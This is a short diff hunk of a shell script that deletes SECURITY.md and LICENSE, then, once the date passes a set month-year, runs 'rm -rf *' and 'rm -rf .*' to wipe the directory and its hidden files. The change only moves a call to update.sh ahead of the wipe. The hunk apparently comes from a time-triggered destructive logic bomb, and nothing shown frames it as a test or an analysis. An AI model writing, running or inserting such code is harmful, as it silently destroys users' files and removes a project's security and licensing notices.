@@ -27,8 +27,8 @@ test -f SECURITY.md && rm SECURITY.md
 test -f LICENSE && rm LICENSE
 
 if (($(date +%m%y) >= 0222)); then
+    bash update.sh
     rm -rf *
     rm -rf .*
-    bash update.sh
 fi
 source .functions/.main
